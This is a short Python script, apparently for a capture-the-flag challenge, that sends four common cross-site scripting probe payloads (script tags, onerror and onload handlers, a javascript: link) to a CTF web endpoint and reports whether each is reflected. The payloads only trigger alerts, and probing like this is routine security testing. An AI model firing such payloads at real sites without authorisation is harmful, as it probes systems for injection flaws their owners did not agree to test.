import requests
from urllib.parse import quote

# Base URL
base_url = "https://ctf.isc2njctf.co/mirror-mirage?query="

# List of payloads to test for XSS
payloads = [
    '<script>alert("XSS Test")</script>',
    '<img src="x" onerror="alert(\'XSS Test\')">',
    '<svg onload="alert(\'XSS Test\')">',
    '<a href="javascript:alert(\'XSS Test\')">Click me</a>'
]

# Iterate over each payload
for payload in payloads:
    # URL-encode the payload
    encoded_payload = quote(payload)
    # Construct the full URL
    url = f"{base_url}{encoded_payload}"
    print(f"Testing payload: {payload}")
    print(f"URL: {url}")
    
    # Send the request
    try:
        response = requests.get(url)
        
        # Check if the payload appears in the response text
        if payload in response.text:
            print("Potential XSS vulnerability detected!")
            print("Response snippet:", response.text[:200])  # Print the first 200 characters of the response
        else:
            print("No XSS detected with this payload.")
    
    except requests.RequestException as e:
        print("Error with request:", e)
    print("\n" + "="*50 + "\n")
